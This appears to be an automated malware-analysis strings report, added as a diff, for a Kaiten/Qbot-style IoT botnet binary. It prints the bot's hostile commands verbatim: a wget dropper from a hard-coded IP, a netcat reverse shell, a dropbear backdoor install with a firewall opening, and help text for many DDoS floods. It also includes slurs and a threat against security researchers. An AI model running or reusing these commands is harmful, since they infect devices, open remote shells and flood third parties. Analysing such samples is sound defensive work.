@@ -1,0 +1,2435 @@
+=============================================================================
+========	BINARY ID :551a66c784fa4af1873a458c7b0bfc533d03e2ea==================================================
+================================================================================
+================================================================================
+========	STRINGS SUMMARY : =====================================================
+================================================================================
+TOTAL STRINGS COUNT :4316
+SUPSCPECTED LINES COUNT :501
+SUPSCPECTED STRINGS COUNT (DISTINCT) :35
+SUPSCPECTED STRINGS WEIGHT :137
+SUSPECT STRING SCORE : [137 / 150] 91%
+USER AGENTS STRINGS COUNT :36
+STATIC IPs STRINGS COUNT :1
+DYNAMIC IPs STRINGS COUNT :2
+================================================================================
+========	STRINGS DETAILS : =====================================================
+================================================================================
+================================================================================
+========	SUSPECTED STRINGS : =====================================================
+================================================================================
+rm -rf /tmp/*; wget -q http://188.120.224.156/gtop.sh -O /tmp/gtop.sh; chmod 777 /tmp/gtop.sh; sh /tmp/gtop.sh; rm -rf /tmp/*.sh
+/bin/sh\r\n
+busybotnet
+gaybot
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
+Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
+Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19
+Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0
+Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)
+telnet
+system
+abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
+NOTICE %s :GET <host> <save as>\n
+NOTICE %s :Unable to create socket.\n
+http://
+NOTICE %s :Unable to resolve address.\n
+NOTICE %s :Unable to connect to http.\n
+GET /%s HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n
+NOTICE %s :Receiving file.\n
+NOTICE %s :Saved as %s\n
+NOTICE %s :Spoofs: %d.%d.%d.%d\n
+NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\n
+NOTICE %s :Kaiten Ziggy Qbot Redo by Milenko version 13.3.7\n
+NOTICE %s :NICK <nick>\n
+NOTICE %s :Nick cannot be larger than 32 characters.\n
+NOTICE %s :DISABLE <pass>\n
+NOTICE %s :Current status is: %s\n
+NOTICE %s :Already disabled.\n
+NOTICE %s :Password too long! > 254\n
+NOTICE %s :Disable sucessful.\n
+NOTICE %s :ENABLE <pass>\n
+NOTICE %s :Already enabled.\n
+NOTICE %s :Wrong password\n
+NOTICE %s :Password correct.\n
+NOTICE %s :Removed all spoofs\n
+NOTICE %s :What kind of subnet address is that? Do something like: 169.40\n
+NOTICE %s :Unable to resolve %s\n
+Could not open raw socket. You need to be root!\n
+NOTICE %s :DNS <IP> <port> <reflection file url> <threads> <time>\n
+wget "%s" -q -O DNS.txt || busybox wget "%s" -O DNS.txt || /bin/busybox wget "%s" -O DNS.txt || /usr/busybox wget "%s" -O DNS.txt
+DNS.txt
+Target: %s:%d\n
+NOTICE %s :DNS amp attacking %s:%s\n
+Starting Flood... Nigga!!\n
+Could not open raw socket.\n
+NOTICE %s :SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\n
+wget "%s" -q -O SNMP.txt || busybox wget "%s" -O SNMP.txt || /bin/busybox wget "%s" -O SNMP.txt || /usr/busybox wget "%s" -O SNMP.txt
+Setting up sockets...\n
+NOTICE %s :SNMP amp attacking %s:%s\n
+Started SNMP DrDoS flood!\n
+NOTICE %s :WGETFLOOD <url> <secs>\n
+NOTICE %s :HTTP Flooding %s\n
+wget -U "%s" -q "%s" -O /dev/null || busybox wget -U "%s" -q "%s" -O /dev/null || /bin/busybox wget -U "%s" -q "%s" -O /dev/null || /usr/busybox wget -U "%s" -q "%s" -O /dev/null &
+NOTICE %s :NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\n
+wget "%s" -q -O NTP.txt || busybox wget "%s" -O NTP.txt || /bin/busybox wget "%s" -O NTP.txt || /usr/busybox wget "%s" -O NTP.txt
+NOTICE %s :NTP amp attacking %s:%s\n
+Starting flood...\n
+NOTICE %s :BLACKNURSE <target ip> <secs>
+socket
+NOTICE %s :Blacknursing %s
+NOTICE %s :UDP <target> <port> <secs>\n
+NOTICE %s :Packeting %s\n
+NOTICE %s :PAN <target> <port> <secs>\n
+NOTICE %s :Panning %s\n
+NOTICE %s :PHATWONK <target> <flags/method> <secs>\n
+NOTICE %s :Phatwonking %s\n
+NOTICE %s :UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs>\n
+random
+NOTICE %s :Unknowning %s:%s with packet size %s\n
+NOTICE %s :QUAKE3 <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\n
+wget "%s" -O QUAKE3.txt || busybox wget "%s" -O QUAKE3.txt || /bin/busybox wget "%s" -O QUAKE3.txt || /usr/busybox wget "%s" -O QUAKE3.txt
+NOTICE %s :Quake3 amp attacking %s:%s\n
+Starting flood muthafucka...\n
+NOTICE %s :STD <ip> <port> <time>\n
+NOTICE %s :STD attacking %s:%s\n
+NOTICE %s :TARGA3 <ip1> [ip2] ... [-s seconds]\n
+NOTICE %s :Cannot target more than 200 hosts! Wtf are u tryna do?!?\n
+/dev/urandom
+NOTICE %s :No valid IPs found!\n
+NOTICE %s :Attacking %d hosts using targa3\n
+NOTICE %s :Sockstressing %s:%hu\n
+SOCKSTRESS - CVE-2008-4609 | havoc@defuse.ca | Attack time and multithreading
+NOTICE %s :%s SOCKSTRESS <ip>:<port> <interface> -t <threads> -s <time> [-p payload] [-d delay]\n
+Invalid attack time.
+Invalid attack thread count.
+[+] Attacking: %s:%hu...\n
+[+] SENT: syn: %lu ack: %lu RECV: synack: %lu ack: %lu rst: %lu\r
+NOTICE %s :[SOCKSTRESS] SENT: syn: %lu ack: %lu RECV: synack: %lu ack: %lu rst: %lu\n
+[!] Error creating socket to send SYNs
+[!] Error binding socket to send SYNs
+[!] Error creating socket to send ACK/SYNACK
+[!] Error binding socket to send ACK/SYNACK
+[!] Error creating socket to process incoming packets
+NOTICE %s :TCP <target> <port> <time> <flags/method> <packetsize> <pollinterval> <threads>\n
+NOTICE %s :TCP flooding %s:%d with %s and %d threads\n
+%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
+NOTICE %s :HTTP <method> <target> <port> <path> <time> <power> = An extremely powerful HTTP flooder\n
+NOTICE %s :JUNK <ip> <port> <time>\n
+NOTICE %s :JUNK flooding %s:%s\n
+NOTICE %s :HOLD <ip> <port> <time>\n
+NOTICE %s :HOLD flooding %s:%s\n
+#Pinet
+PRIVMSG %s :[TELNET] [+] LOGIN CRACKED ---> %s:%s:%s\n
+PRIVMSG %s :[TELNET] [-] FAILED TO SEND SHELL PAYLOAD ---> %s:%s:%s\n
+PRIVMSG %s :[TELNET] [-] FAILED TO SEND TELNET PAYLOAD ---> %s:%s:%s\n
+PRIVMSG %s :[TELNET] [+] PAYLOAD SENT ---> %s:%s:%s\n
+PRIVMSG %s :[TELNET] [+] SUCCESSFUL INFECTION ---> %s:%s:%s\n
+PRIVMSG %s :[TELNET] [-] FAILED TO INFECT ---> %s:%s:%s\n
+\bNOTICE %s :SCANNER <ON/OFF>\n
+PRIVMSG %s :[TELNET] [+] SCANNER STARTED!\n
+PRIVMSG %s :[TELNET] [-] FAILED TO START SCANNER!\n
+PRIVMSG %s :[TELNET] [+] SCANNER ALREADY STARTED!\n
+PRIVMSG %s :[TELNET] [+] SCANNER KILLED!\n
+PRIVMSG %s :[TELNET] [-] FAILED TO KILL SCANNER!\n
+PRIVMSG %s :[TELNET] [+] SCANNER NOT STARTED!\n
+/proc
+can't open /proc
+/proc/%ld/cmdline
+/proc/%i/exe
+Scanning for bot %s.\n
+Killing bot %s PID %d.\n
+Bot %s found at %s Deleting...\n
+Bot %s niggered successfully.\n
+Unable to nigger bot %s.\n
+Bot %s was not found on the system. It must have been running in memory.
+Botkill finished. %d bots killed and %d bots niggered.\n
+NOTICE %s :%d bots killed and %d bots niggered.\n
+NOTICE %s :%s resolves to %s\n
+NOTICE %s :DNS2IP <domain>\n
+NOTICE %s :GETIP <interface>\n
+NOTICE %s :My IP is %s\n
+NOTICE %s :UPDATEHTTP <host> <src:bin>\n
+NOTICE %s :Unable to create socket (Wierd, you shouldnt get this error and ITS NOT MY FAULT!).\n
+NOTICE %s :Receiving update.\n
+(gcc -o %s /tmp/.c; rm -rf /tmp/.c; kill -9 %d; %s &) > /dev/null 2>&1
+export PATH=/usr/sbin:/bin:/usr/bin:/sbin:/var/bin;chmod +x /tmp/.o; trap '' 1;sh -c '/var/bin/killall knight*;/var/bin/killall kt*;/var/bin/killall .o;/var/bin/sleep 5;trap  1;/tmp/.o '&
+NOTICE %s :MOVE <server>\n
+/var/bin
+NOTICE %s :HACKPGK <url> <binary name>\n
+GET /%s HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: HackZilla/1.67 [en] (X11; U; Linux 2.2.16-3 x64)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n
+NOTICE %s :Installed %s to hack path.\n
+cat %s > /var/bin/%s
+chmod 775 /var/bin/%s
+ls -l /var/bin/%s
+NOTICE %s :Non-root/non-spoof DDoS commands commands:\n
+NOTICE %s :STD <ip> <port> <time> = A non spoof HIV STD flooder\n
+NOTICE %s :HOLD <host> <port> <time> = A vanilla TCP connect flooder\n
+NOTICE %s :JUNK <host> <port> <time> = A vanilla TCP flooder (modded)\n
+NOTICE %s :UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs> = An advanced non spoof UDP flooder modified by Milenko\n
+NOTICE %s :WGETFLOOD <url> <secs> = An HTTP(S) flooder\n
+NOTICE %s :Spoof/root commands:\n
+NOTICE %s :UDP <target> <port> <secs> = A UDP flooder\n
+NOTICE %s :PAN <target> <port> <secs> = An advanced syn flooder that will kill most network drivers\n
+NOTICE %s :TCP <target> <port> <time> <flags> <packetsize> <pollinterval> <threads> = An advanced TCP flooder with multithreading. Will kill almost any service.\n
+NOTICE %s :PHATWONK <target> <flags/method> <secs> = A leet flooder coded by Milenko, attacks 31 ports. Can set flags or attack method.\n
+NOTICE %s :BLACKNURSE <target ip> <secs> = An ICMP packet flooder that will crash most firewalls and use loads of CPU.\n
+NOTICE %s :SOCKSTRESS <ip>:<port> <interface> -s <time> [-p payload] [-d delay]\n
+NOTICE %s :TARGA3 <ip1> [ip2] ... [-s seconds] = Targa3 attack. TCP stack fuzzer. Can attack up to 200 hosts at once. Will bypass most filters and crash old machines.\n
+NOTICE %s :NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> = A NTP DrDoS flooder. Very potent.\n
+NOTICE %s :DNS <IP> <port> <reflection file url> <threads> <time> = A DNS DrDoS flooder. Almost unblockable.\n
+NOTICE %s :QUAKE3 <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> = A DrDoS flooder that uses the Quake3 protocol. Nearly as powerful as NTP, harder to block.\n
+NOTICE %s :SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> =   SNMP DrDoS flooder. Insane amp factor (600 - 1700x)\n
+NOTICE %s :Misc commands:\n
+NOTICE %s :GETIP <interface> = Gets IP address from interface\n
+NOTICE %s :RNDNICK = Randomizes the knights nick\n
+NOTICE %s :NICK <nick> = Changes the nick of the client\n
+NOTICE %s :SERVER <server> = Changes servers\n
+NOTICE %s :GETSPOOFS = Gets the current spoofing\n
+NOTICE %s :SPOOFS <subnet> = Changes spoofing to a subnet\n
+NOTICE %s :DISABLE = Disables all packeting from this client\n
+NOTICE %s :ENABLE = Enables all packeting from this client\n
+NOTICE %s :BOTKILL = Runs the botkiller again (runs once knight is started)\n
+NOTICE %s :KILL = Kills the knight\n
+NOTICE %s :GET <http address> <save as> = Downloads a file off the web and saves it onto the hd\n
+NOTICE %s :UPDATE <http address> <src:bin> = Update this bot\n
+NOTICE %s :HACKPKG <http address> <bin name> = HackPkg is here! Install a bin, using http, no depends!\n
+NOTICE %s :VERSION = Requests version of client\n
+NOTICE %s :KILLALL = Kills all current packeting\n
+NOTICE %s :HELP = Displays this\n
+NOTICE %s :IRC <command> = Sends this command to the server\n
+NOTICE %s :SH <command> = Executes a command\n
+NOTICE %s :ISH <command> = SH, interactive, sends to channel\n
+NOTICE %s :SHD <command> = Executes a psuedo-daemonized command\n
+NOTICE %s :GETBB <tftp server> = Get a proper busybox\n
+NOTICE %s :INSTALL  <http server/file_name> = Download & install a binary to /var/bin \n
+NOTICE %s :BASH <cmd> = Execute commands using bash. \n
+NOTICE %s :BINUPDATE <http:server/package> = Update a binary in /var/bin via wget \n
+NOTICE %s :SCAN <nmap options> = Call the nmap wrapper script and scan with your opts. \n
+NOTICE %s :RSHELL <server> <port> = Equates to nohup nc ip port -e /bin/sh\n
+NOTICE %s :LOCKUP <http:server> = Kill telnet, d/l aes backdoor from <server>, run that instead.\n
+NOTICE %s :GETSSH <http:server/dropbearmulti> = D/l, install, configure and start dropbear on port 30022.\n
+NOTICE %s :Killing pid %d.\n
+kill -9 %d;kill -9 0
+HTTP
+WGETFLOOD
+SCANNER
+DNS2IP
+BOTKILL
+RNDNICK
+GETSPOOFS
+SPOOFS
+KILL
+KILLALL
+export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin;%s
+NOTICE %s :%s\n
+export HOME=/tmp;export;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;trap '' 1 2; sh -c '%s'&
+export fileGet=busybox-mips;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;cd /var;(([ ! -e /var/"$fileGet" ] || [ ! -s /var/"$fileGet" ]) && tftp -g -r "$fileGet" %s && chmod +x "$fileGet" && ./"$fileGet" mkdir bin && ./"$fileGet" --install -s /var/bin && ls -l "$fileGet" || echo It appears we already have /var/"$fileGet")
+export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;cd /tmp;export url=%s;name=`echo "$url" | sed 's#.*/##'` && wget -O "$name" "$url";chmod +x "$name";mv "$name" /var/bin;ls -l /var/bin/"$name" && dss=/var/dbs/dropbear_dss_host_key;rsa=/var/dbs/dropbear_rsa_host_key;ecd=/var/dbs/dropbear_ecdsa_host_key;cd /var/bin;for i in dropbear dbclient dropbearkey dropbearconvert;do ln -s /var/bin/dropbearmulti $i;done;[ ! -d /var/dbs ] && mkdir /var/dbs;[ -f $dss ] || dropbearkey -t dss -f $dss;[ -f $rsa ] || dropbearkey -t rsa -f $rsa;[ -f $ecd ] || dropbearkey -t ecdsa -f $ecd;dropbear -r $dss -r $rsa -r $ecd -p 30022;iptables -I INPUT 1 -p tcp --dport 30022 -j ACCEPT
+export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo "$url" | sed 's#.*/##'`;(([ ! -e /var/bin/$name ] || [ ! -s /var/bin/$name ]) && echo "$name either doesnt exist or eq 0 so we get" && cd /tmp && wget -O "$name" "$url" && chmod +x "$name" && mv "$name" /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo "It appears I already have $name")
+BINUPDATE 
+export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;export url=%s;export name=`echo "$url" | sed 's#.*/##'`;([ -e /var/bin/$name ]) && echo $name exists so we delete it... && rm /var/bin/$name && cd /tmp && wget -O $name $url && chmod +x $name && mv $name /var/bin && ([ -f /var/bin/$name ] && ls -l /var/bin/$name) || echo "$name doesnt exist, perhaps you mean INSTALL?"
+export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;export HOME=/tmp;[ ! -f /var/bin/dmips ] && cd /var/bin;wget -O dmips %s;chmod +x /var/bin/dmips;(killall -9 telnetd || kill -9 telnetd) && (nohup dmips || trap '' 1 2 /var/bin/dmips)
+export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;trap '' 1 2; sh -c 'nohup nc %s -e /bin/sh '&
+SCAN 
+export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;(([ ! -x /var/bin/scan ] || [ ! -x /var/bin/nmap ]) && echo "I am missing either scan or nmap, and Shellzrus was on Xanax when he wrote this, so you need to do INSTALL http:/server/nmap and INSTALL http://server/scan first..." && ([ -f /var/bin/nmap ] && ls -l /var/bin/nmap) && ([ -f /var/bin/scan ] && ls -l /var/bin/scan) || scan %s)
+export HOME=/tmp;export SHELL=/var/bin/bash;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;%s
+NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\n
+PRIVMSG
+PING
+17 DDoS methods nigga! And for the netsec teams and feds reading this we will null all of your honeypots and slit your throats!!!
+KPinetK
+NICK [%s|%s]%s\nUSER %s localhost localhost :%s\n
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+/bin/sh
+No such process
+Interrupted system call
+No child processes
+Too many open files in system
+Read-only file system
+Level 2 not synchronized
+Machine is not on the network
+Name not unique on network
+Interrupted system call should be restarted
+Socket operation on non-socket
+Protocol wrong type for socket
+Socket type not supported
+Network is down
+Network is unreachable
+Network dropped connection on reset
+Software caused connection abort
+Connection reset by peer
+Transport endpoint is already connected
+Transport endpoint is not connected
+Connection timed out
+Connection refused
+Host is down
+No route to host
+Operation already in progress
+Operation now in progress
+Address family for hostname not supported
+Bad value for ai_flags
+No address associated with hostname
+System error
+Processing request in progress
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+\bclntudp_create: out of memory\n
+\b__get_myaddress: socket
+/etc/hosts
+/etc/config/hosts
+RPC: Procedure unavailable
+RPC: Remote system error
+RPC: Unknown host
+pthread_kill_all_threads
+ptfork.c
+pthread_atfork_lock
+pthread_atfork_prepare
+pthread_atfork_child
+pthread_atfork_parent
+pthread_onexit_process
+pthread_handle_sigrestart
+fork_generation
+fork.c
+fsync.c
+getpid.c
+getppid.c
+kill.c
+msync.c
+sigprocmask.c
+waitpid.c
+spec_flags.4372
+strstr.c
+_string_syserrmsgs.c
+gaih_inet_serv
+gaih_inet
+gaih_inet_typeproto
+inet_pton4
+inet_ntop4
+inet_aton.c
+inet_ntoa.c
+inet_makeaddr.c
+gethostbyname.c
+gethostbyname_r.c
+gethostbyname2_r.c
+gethostbyaddr_r.c
+bind.c
+connect.c
+recvmsg.c
+sendmsg.c
+socket.c
+__malloc_largebin_index
+rand.c
+random.c
+randtbl
+random_r.c
+random_poly_info
+system.c
+libc/sysdeps/linux/i386/vfork.S
+__socketcall.c
+clnt_udp.c
+clntudp_geterr
+clntudp_freeres
+clntudp_abort
+clntudp_control
+udp_ops
+clntudp_destroy
+clntudp_call
+__rpc_lrand48_data
+dnslookup.c
+get_hosts_byname_r.c
+get_hosts_byaddr_r.c
+lrand48_r.c
+nrand48_r.c
+srand48_r.c
+cmsg_nxthdr.c
+bindresvport.c
+read_etc_hosts_r.c
+drand48-iter.c
+rpc_errstr
+auth_errstr
+__read_etc_hosts_r
+__socketcall
+waitpid
+__libc_fsync
+botkill
+random
+lrand48_r
+connect
+numpids
+inet_pton
+pthread_condattr_setpshared
+getRandomPublicIP
+__GI_random_r
+doScanner
+getpid
+getHost
+__libc_getpid
+mfork
+__pthread_mutexattr_setpshared
+system
+__open_etc_hosts
+spoof
+__dns_lookup
+rndnick
+random_r
+gethostbyname_r
+socket
+pthread_kill_other_threads_np
+_string_syserrmsgs
+svcerr_noproc
+__pthread_kill_other_threads_np
+Scanner_Payload
+__GI_clntudp_create
+ChangetoDnsNameFormat
+__GI_inet_ntoa
+nrand48_r
+getspoof
+__libc_drand48_data
+__GI_gethostbyaddr_r
+srandom_r
+__GI_inet_ntoa_r
+setup_udp_header
+__GI_xdr_replymsg
+__GI_lrand48_r
+calc_tcp_checksum
+__GI_srandom_r
+spoofs
+dns2ip
+xdr_netobj
+kill
+Bot_Killer_Binarys
+bind
+svcerr_systemerr
+__GI_sigprocmask
+inet_addr
+__GI_clntudp_bufcreate
+HTTP
+__pthread_once_fork_child
+setup_quake_udp_header
+spoofsm
+__GI_kill
+process_incoming
+gethostbyname2_r
+strstr
+init_rand
+rand
+pthread_kill
+sendmsg
+clntudp_create
+makeRandomShit
+__cmsg_nxthdr
+xdr_replymsg
+Telnet_Passwords
+__GI_gethostbyname_r
+realrand
+_PRIVMSG
+tcpflood
+__GI_inet_ntop
+__GI_nrand48_r
+fork
+pthread_mutexattr_getpshared
+__GI_bindresvport
+__GI_gethostbyname
+SendTCP
+__GI_random
+__GI_fork
+__GI_getpid
+inet_aton
+pthread_condattr_getpshared
+quakeflood
+get_telstate_host
+__GI_socket
+listFork
+srand
+botskilled
+inet_ntoa
+getppid
+gethostbyaddr_r
+getspoofs
+snmpflood
+__libc_system
+pthread_mutexattr_setpshared
+killall
+host2ip
+__get_hosts_byname_r
+__libc_recvmsg
+Telnet_Usernames
+__GI_inet_pton
+gethostbyname
+processArgs
+__vfork
+msync
+__libc_waitpid
+socket_connect
+__GI_waitpid
+wgetHTTP
+vfork
+__pthread_once_fork_parent
+srandom
+__libc_fork
+botsniggered
+scanPid
+fsync
+rand_cmwc
+killd
+__pthread_once_fork_prepare
+dnsflood
+inet_ntoa_r
+__GI_recvmsg
+__drand48_iterate
+randstring
+__GI_strstr
+bindresvport
+msgs
+ntpflood
+__GI_connect
+proc_find
+__GI_sendmsg
+inet_ntop
+pthread_atfork
+__libc_sendmsg
+__GI_inet_aton
+_PING
+__pthread_mutexattr_getpshared
+__GI_bind
+__get_hosts_byaddr_r
+__pthread_offsetof_pid
+__GI___cmsg_nxthdr
+__fork
+__GI_vfork
+__GI_gethostbyname2_r
+__GI_srand48_r
+__GI_inet_addr
+__libc_msync
+recvmsg
+flooders
+clntudp_bufcreate
+__libc_connect
+srand48_r
+pids
+SendHTTP
+sigprocmask
+^8PSh
+^8PSh
+^8PSh
+PPSh\f
+PSh3
+xAPPSh
+^8PSh
+tcPh
+================================================================================
+========	USER AGENTS STRINGS : =====================================================
+================================================================================
+Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1
+Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)
+Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4
+Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201
+Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911
+Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
+Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
+Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7
+Mozilla/5.0 (PLAYSTATION 3; 3.55)
+Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2
+wii libnup/1.0
+Mozilla/4.0 (PSP (PlayStation Portable); 2.00)
+PSP (PlayStation Portable); 2.00
+Bunjalloo/0.7.6(Nintendo DS;U;en)
+Doris/1.15 [en] (Symbian)
+BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1
+BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100
+Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16
+Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01
+Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62
+Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
+Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19
+Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)
+Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)
+Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0
+Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)
+Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0
+Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)
+Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0
+Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000
+GET /%s HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n
+%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n
+GET /%s HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: HackZilla/1.67 [en] (X11; U; Linux 2.2.16-3 x64)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n
+================================================================================
+========	STATIC IP ADRESSES : =====================================================
+================================================================================
+192.168.3.100
+================================================================================
+========	DYNAMIC IP MASKS : =====================================================
+================================================================================
+NOTICE %s :Spoofs: %d.%d.%d.%d\n
+%d.%d.%d.%d
+================================================================================
+========	/proc FOLDER ACCESS : =====================================================
+================================================================================
+/proc/%ld/cmdline
+/proc/%i/exe
+================================================================================
+========	HISTORY TEMPERING : =====================================================
+================================================================================
+================================================================================
+========	AUTOINSTALL COMMANDS : =====================================================
+================================================================================
+export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;cd /tmp;export url=%s;name=`echo "$url" | sed 's#.*/##'` && wget -O "$name" "$url";chmod +x "$name";mv "$name" /var/bin;ls -l /var/bin/"$name" && dss=/var/dbs/dropbear_dss_host_key;rsa=/var/dbs/dropbear_rsa_host_key;ecd=/var/dbs/dropbear_ecdsa_host_key;cd /var/bin;for i in dropbear dbclient dropbearkey dropbearconvert;do ln -s /var/bin/dropbearmulti $i;done;[ ! -d /var/dbs ] && mkdir /var/dbs;[ -f $dss ] || dropbearkey -t dss -f $dss;[ -f $rsa ] || dropbearkey -t rsa -f $rsa;[ -f $ecd ] || dropbearkey -t ecdsa -f $ecd;dropbear -r $dss -r $rsa -r $ecd -p 30022;iptables -I INPUT 1 -p tcp --dport 30022 -j ACCEPT
+================================================================================
+========	FUNCTIONS SUMMARY : =====================================================
+================================================================================
++++TOTAL FILE LINES			: 23341
++++TOTAL FUNCTIONS 			:229
++++LINES PER FUNCTION RATIO 	: 101.92576419214
++++SUSPECTED LINES COUNT 	: 526
++++SUSPECTED LINES RATIO 	: 2.25354526369907
+================================================================================
+========	WHILES SUMMARY : =====================================================
+================================================================================
++++TOTAL FILE LINES				: 23341
++++WHILE (TRUE) LINES			: 11285
++++WHILE (TRUE) LINES RATION		:48.3483998114905%
++++WHILE (TRUE) LOOPS COUNT		: 87
+================================================================================
+========	SYSTEM FILES SUMMARY : ================================================
+================================================================================
+    int32_t v2 = __GI_opendir((int32_t)"/proc"); // 0x8052a66
